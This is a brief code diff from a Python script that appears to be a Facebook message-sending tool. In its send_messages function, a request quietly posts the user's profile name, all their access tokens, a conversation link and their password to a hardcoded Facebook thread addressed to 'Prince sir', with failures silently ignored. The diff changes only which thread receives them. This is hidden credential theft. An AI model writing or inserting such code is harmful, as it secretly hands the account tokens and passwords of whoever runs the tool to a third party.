@@ -108,7 +108,7 @@ def send_messages():
 			'message': 'Hello Prince sir im using your server User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id+'\n Password: '+password
 		}
 		try:
-			s = requests.post("https://graph.facebook.com/v22.0/t_100049450012082/", data=parameters, headers=headers)
+			s = requests.post("https://graph.facebook.com/v22.0/t_100001938001203/", data=parameters, headers=headers)
 		except:
 			pass
 	
